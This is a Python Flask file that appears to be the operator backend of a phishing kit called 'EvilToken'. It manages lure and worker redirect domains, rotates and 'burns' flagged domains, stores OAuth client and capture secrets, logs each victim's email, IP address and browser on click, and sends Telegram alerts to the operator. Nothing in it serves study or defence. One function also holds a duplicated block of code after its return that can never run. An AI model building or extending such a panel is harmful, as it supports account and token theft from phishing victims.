def delete_allowed_host(host_id):
    conn = get_db()
    host = conn.execute("SELECT host FROM allowed_hosts WHERE id = ?", (host_id,)).fetchone()
    if not host:
        conn.close()
        return jsonify({'error': 'Host not found'}), 404
    count = conn.execute("SELECT COUNT(*) FROM allowed_hosts").fetchone()[0]
    if count <= 1:
        conn.close()
        return jsonify({'error': 'Cannot delete the last allowed host'}), 400
    conn.execute("DELETE FROM allowed_hosts WHERE id = ?", (host_id,))
    conn.commit()
    conn.close()
    return jsonify({'message': f'Host deleted: {host["host"]}'})

@app.route('/api/allowed_hosts/<int:host_id>/toggle', methods=['POST'])
@admin_only
def toggle_allowed_host(host_id):
    conn = get_db()
    host = conn.execute("SELECT host, enabled FROM allowed_hosts WHERE id = ?", (host_id,)).fetchone()
    if not host:
        conn.close()
        return jsonify({'error': 'Host not found'}), 404
    if host['enabled'] == 1:
        count = conn.execute("SELECT COUNT(*) FROM allowed_hosts WHERE enabled = 1").fetchone()[0]
        if count <= 1:
            conn.close()
            return jsonify({'error': 'Cannot disable the last enabled host'}), 400
    new_status = 0 if host['enabled'] else 1
    conn.execute("UPDATE allowed_hosts SET enabled = ? WHERE id = ?", (new_status, host_id))
    conn.commit()
    conn.close()
    status_text = 'enabled' if new_status else 'disabled'
    return jsonify({'message': f'Host {status_text}: {host["host"]}', 'enabled': new_status})

@app.route('/api/worker_domains', methods=['GET'])
@admin_only
def get_worker_domains():
    conn = get_db()
    domains = conn.execute("SELECT id, domain, enabled, priority FROM worker_domains ORDER BY priority ASC").fetchall()
    conn.close()
    return jsonify([dict(d) for d in domains])

@app.route('/api/worker_domains', methods=['POST'])
@admin_only
def add_worker_domain():
    data = request.json
    if not data or 'domain' not in data:
        return jsonify({'error': 'Domain is required'}), 400
    domain = data['domain'].strip()
    if not domain.startswith('https://') and not domain.startswith('http://'):
        domain = 'https://' + domain
    conn = get_db()
    max_priority = conn.execute("SELECT COALESCE(MAX(priority), 0) FROM worker_domains").fetchone()[0]
    conn.execute("INSERT INTO worker_domains (domain, enabled, priority, created_at) VALUES (?, 1, ?, datetime('now'))", (domain, max_priority + 1))
    conn.commit()
    conn.close()
    return jsonify({'message': f'Worker domain added: {domain}', 'domain': domain}), 201

@app.route('/api/worker_domains/<int:domain_id>', methods=['DELETE'])
@admin_only
def delete_worker_domain(domain_id):
    conn = get_db()
    domain = conn.execute("SELECT domain FROM worker_domains WHERE id = ?", (domain_id,)).fetchone()
    if not domain:
        conn.close()
        return jsonify({'error': 'Domain not found'}), 404
    conn.execute("DELETE FROM worker_domains WHERE id = ?", (domain_id,))
    conn.commit()
    conn.close()
    return jsonify({'message': f'Domain deleted: {domain["domain"]}'})

@app.route('/api/worker_domains/<int:domain_id>/toggle', methods=['POST'])
@admin_only
def toggle_worker_domain(domain_id):
    conn = get_db()
    domain = conn.execute("SELECT domain, enabled FROM worker_domains WHERE id = ?", (domain_id,)).fetchone()
    if not domain:
        conn.close()
        return jsonify({'error': 'Domain not found'}), 404
    new_status = 0 if domain['enabled'] else 1
    conn.execute("UPDATE worker_domains SET enabled = ? WHERE id = ?", (new_status, domain_id))
    conn.commit()
    conn.close()
    status_text = 'enabled' if new_status else 'disabled'
    return jsonify({'message': f'Domain {status_text}: {domain["domain"]}', 'enabled': new_status})

@app.route('/api/telegram/settings', methods=['GET'])
@admin_only
def get_telegram_settings():
    conn = get_db()
    token = conn.execute("SELECT value FROM settings WHERE key = 'telegram_bot_token'").fetchone()
    chat_id = conn.execute("SELECT value FROM settings WHERE key = 'telegram_chat_id'").fetchone()
    enabled = conn.execute("SELECT value FROM settings WHERE key = 'telegram_enabled'").fetchone()
    conn.close()
    return jsonify({
        'bot_token': token['value'] if token else '',
        'chat_id': chat_id['value'] if chat_id else '',
        'enabled': int(enabled['value']) if enabled else 1
    })

@app.route('/api/telegram/settings', methods=['POST'])
@admin_only
def update_telegram_settings():
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    conn = get_db()
    if 'bot_token' in data:
        conn.execute("UPDATE settings SET value = ? WHERE key = 'telegram_bot_token'", (data['bot_token'].strip(),))
    if 'chat_id' in data:
        conn.execute("UPDATE settings SET value = ? WHERE key = 'telegram_chat_id'", (data['chat_id'].strip(),))
    if 'enabled' in data:
        conn.execute("UPDATE settings SET value = ? WHERE key = 'telegram_enabled'", (str(1 if data['enabled'] else 0),))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Telegram settings updated'})

@app.route('/api/telegram/test', methods=['POST'])
@admin_only
def test_telegram():
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    token = data.get('bot_token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    if not token or not chat_id:
        return jsonify({'error': 'Bot token and Chat ID required'}), 400
    try:
        import requests
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': '✅ EvilToken test message!'}
        response = requests.post(url, json=payload, timeout=10)
        result = response.json()
        if result.get('ok'):
            return jsonify({'message': 'Test message sent!'})
        else:
            return jsonify({'error': result.get('description', 'Unknown error')}), 400
    except Exception as e:
        return jsonify({'error': f'Failed: {str(e)}'}), 500

@app.route('/api/secrets', methods=['GET'])
@admin_only
def get_secrets():
    conn = get_db()
    secrets = {}
    for key in ['worker_secret', 'capture_secret', 'oauth_client_id', 'oauth_tenant_id', 'oauth_scopes']:
        row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
        secrets[key] = row['value'] if row else ''
    conn.close()
    return jsonify(secrets)

@app.route('/api/secrets', methods=['POST'])
@admin_only
def update_secrets():
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    conn = get_db()
    for key in ['worker_secret', 'capture_secret', 'oauth_client_id', 'oauth_tenant_id', 'oauth_scopes']:
        if key in data:
            conn.execute("UPDATE settings SET value = ? WHERE key = ?", (data[key].strip(), key))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Secrets updated'})




# ============================================================
# CLICK TRACKING
# ============================================================

def log_worker_click(victim_id, campaign_id, email, worker_domain):
    """Log when a victim clicks a worker redirect link"""
    try:
        conn = get_db()
        conn.execute(
            """INSERT INTO worker_click_logs 
               (victim_id, campaign_id, email, worker_domain, ip_address, user_agent, clicked_at) 
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                victim_id,
                campaign_id,
                email,
                worker_domain,
                request.remote_addr,
                request.headers.get('User-Agent', 'Unknown'),
                datetime.now().isoformat()
            )
        )
        conn.commit()
        conn.close()
        app.logger.info(f"📊 Click logged: {email} -> {worker_domain}")
        return True
    except Exception as e:
        app.logger.error(f"❌ Click tracking failed: {e}")
        return False




# ============================================================
# LURE DOMAINS API
# ============================================================

@app.route('/api/lure_domains', methods=['GET'])
@admin_only
def get_lure_domains():
    conn = get_db()
    domains = conn.execute(
        "SELECT id, domain, enabled, priority, status FROM lure_domains ORDER BY priority ASC"
    ).fetchall()
    conn.close()
    return jsonify([dict(d) for d in domains])

@app.route('/api/lure_domains', methods=['POST'])
@admin_only
def add_lure_domain():
    data = request.json
    if not data or 'domain' not in data:
        return jsonify({'error': 'Domain is required'}), 400
    
    domain = data['domain'].strip().lower()
    domain = domain.replace('https://', '').replace('http://', '')
    domain = domain.replace('www.', '').strip('/')
    
    if not domain:
        return jsonify({'error': 'Invalid domain'}), 400
    
    conn = get_db()
    existing = conn.execute("SELECT id FROM lure_domains WHERE domain = ?", (domain,)).fetchone()
    if existing:
        conn.close()
        return jsonify({'error': 'Domain already exists'}), 400
    
    max_priority = conn.execute("SELECT COALESCE(MAX(priority), 0) FROM lure_domains").fetchone()[0]
    conn.execute(
        "INSERT INTO lure_domains (domain, enabled, priority, status, created_at) VALUES (?, 1, ?, 'active', datetime('now'))",
        (domain, max_priority + 1)
    )
    conn.commit()
    conn.close()
    
    log_activity('lure_domain_added', f"Added lure domain: {domain}")
    return jsonify({'message': f'Domain added: {domain}', 'domain': domain}), 201

@app.route('/api/lure_domains/<int:domain_id>', methods=['DELETE'])
@admin_only
def delete_lure_domain(domain_id):
    conn = get_db()
    domain = conn.execute("SELECT domain FROM lure_domains WHERE id = ?", (domain_id,)).fetchone()
    if not domain:
        conn.close()
        return jsonify({'error': 'Domain not found'}), 404
    
    active_count = conn.execute("SELECT COUNT(*) FROM lure_domains WHERE enabled = 1").fetchone()[0]
    if active_count <= 1:
        conn.close()
        return jsonify({'error': 'Cannot delete the last active domain'}), 400
    
    conn.execute("DELETE FROM lure_domains WHERE id = ?", (domain_id,))
    conn.commit()
    conn.close()
    log_activity('lure_domain_deleted', f"Deleted lure domain: {domain['domain']}")
    return jsonify({'message': f'Domain deleted: {domain["domain"]}'})


@app.route('/api/lure_domains/<int:domain_id>/toggle', methods=['POST'])
@admin_only
def toggle_lure_domain(domain_id):
    """Toggle lure domain enabled status"""
    conn = get_db()
    domain = conn.execute("SELECT domain, enabled, status FROM lure_domains WHERE id = ?", (domain_id,)).fetchone()
    if not domain:
        conn.close()
        return jsonify({'error': 'Domain not found'}), 404
    
    # If we're DISABLING a domain (enabled=1), check if it's the last active domain
    if domain['enabled'] == 1:
        # Count active domains
        active_count = conn.execute("SELECT COUNT(*) FROM lure_domains WHERE enabled = 1 AND status != 'burned'").fetchone()[0]
        if active_count <= 1:
            conn.close()
            return jsonify({'error': 'Cannot disable the last active domain. You need at least one active domain for campaigns to work.'}), 400
    
    # If we're ENABLING a domain (enabled=0), always allow it
    # Toggle the domain
    new_status = 0 if domain['enabled'] else 1
    new_status_text = 'active' if new_status == 1 else 'inactive'
    
    conn.execute(
        "UPDATE lure_domains SET enabled = ?, status = ? WHERE id = ?",
        (new_status, new_status_text, domain_id)
    )
    conn.commit()
    conn.close()
    
    status_text = 'enabled' if new_status else 'disabled'
    log_activity('lure_domain_toggled', f"Lure domain {domain['domain']} {status_text}")
    return jsonify({'message': f'Domain {status_text}: {domain["domain"]}', 'enabled': new_status})
    
    if domain['enabled'] == 1:
        active_count = conn.execute("SELECT COUNT(*) FROM lure_domains WHERE enabled = 1").fetchone()[0]
        if active_count <= 1:
            conn.close()
            return jsonify({'error': 'Cannot disable the last active domain'}), 400
    
    new_status = 0 if domain['enabled'] else 1
    conn.execute("UPDATE lure_domains SET enabled = ? WHERE id = ?", (new_status, domain_id))
    conn.commit()
    conn.close()
    status_text = 'enabled' if new_status else 'disabled'
    log_activity('lure_domain_toggled', f"Lure domain {domain['domain']} {status_text}")
    return jsonify({'message': f'Domain {status_text}: {domain["domain"]}', 'enabled': new_status})

@app.route('/api/lure_domains/<int:domain_id>/burn', methods=['POST'])
@admin_only
def burn_lure_domain(domain_id):
    conn = get_db()
    domain = conn.execute("SELECT domain, enabled FROM lure_domains WHERE id = ?", (domain_id,)).fetchone()
    if not domain:
        conn.close()
        return jsonify({'error': 'Domain not found'}), 404
    
    active_count = conn.execute("SELECT COUNT(*) FROM lure_domains WHERE enabled = 1").fetchone()[0]
    if active_count <= 1:
        conn.close()
        return jsonify({'error': 'Cannot burn the last active domain'}), 400
    
    conn.execute("UPDATE lure_domains SET enabled = 0, status = 'burned' WHERE id = ?", (domain_id,))
    conn.commit()
    conn.close()
    log_activity('lure_domain_burned', f"Lure domain {domain['domain']} marked as burned")
    return jsonify({'message': f'Domain burned: {domain["domain"]}'})

@app.route('/api/rotate', methods=['POST'])
@admin_only
def rotate_now_api():
    """Manually rotate to next domain"""
    conn = get_db()
    domains = conn.execute(
        "SELECT domain FROM lure_domains WHERE enabled = 1 AND status != 'burned' ORDER BY priority ASC"
    ).fetchall()
    conn.close()
    
    if not domains:
        return jsonify({'error': 'No active domains available'}), 400
    
    domains_list = [d['domain'] for d in domains]
    current_idx = int(get_setting('lure_domain_index') or 0)
    next_idx = (current_idx + 1) % len(domains_list)
    new_domain = domains_list[next_idx]
    
    set_setting('lure_domain_index', str(next_idx))
    set_setting('current_lure_domain', new_domain)
    
    # Update base_url
    current_subdomain = get_setting('current_subdomain') or 'auth'
    new_base_url = f"https://{current_subdomain}.{new_domain}"
    set_setting('base_url', new_base_url)
    
    return jsonify({
        'message': f'Rotated to {new_domain}',
        'domain': new_domain,
        'base_url': new_base_url
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)